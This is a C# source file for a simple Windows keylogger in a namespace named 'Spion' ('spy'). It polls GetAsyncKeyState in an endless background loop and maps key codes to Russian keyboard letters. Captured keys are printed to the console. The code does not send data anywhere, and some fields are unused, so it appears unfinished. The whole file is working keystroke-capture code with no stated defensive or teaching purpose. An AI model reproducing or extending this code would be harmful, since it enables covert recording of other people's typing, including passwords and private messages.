using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Spion
{
    public class Listener
    {
        private List<Keys> keyBuffer = new List<Keys>();
        private string stringBuffer = "";
        private bool isEnglish = true;


        private readonly int sleep;
        private readonly int minIndex;
        private readonly int maxIndex;

        public Listener(int minIndex, int maxIndex, int sleep)
        {
            this.sleep = sleep;
            this.maxIndex = maxIndex;
            this.minIndex = minIndex;
        }
        public void StartListening()
        {
            Task.Factory.StartNew(() =>
            {
                while (true)
                {
                    for (int i = minIndex; i <= maxIndex; i++)
                    {
                        int state = GetAsyncKeyState(i);
                        if (state == 1 || state == -32767)
                        {
                            Console.WriteLine(GetSign(i));
                        }
                    }
                    Thread.Sleep(sleep);
                }
            });
        }

        private string GetSign(int code)
        {
            switch (code)
                {
                    case 65: return "ф";
                    case 66: return "и";
                    case 67: return "с";
                    case 68: return "в";
                    case 69: return "у";
                    case 70: return "а";
                    case 71: return "п";
                    case 72: return "р";
                    case 73: return "ш";
                    case 74: return "о";
                    case 75: return "л";
                    case 76: return "д";
                    case 77: return "ь";
                    case 78: return "т";
                    case 79: return "щ";
                    case 80: return "з";
                    case 81: return "й";
                    case 82: return "к";
                    case 83: return "ы";
                    case 84: return "е";
                    case 85: return "г";
                    case 86: return "м";
                    case 87: return "ц";
                    case 88: return "ч";
                    case 89: return "н";
                    case 90: return "я";
                    case 219: return "х";
                    case 221: return "ъ";
                    case 186: return "ж";
                    case 222: return "э";
                    case 188: return "б";
                    case 190: return "ю";
                    case 191: return ".";
                    default: return (Keys) code + " - " + code;
                }
        }
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);
    }
}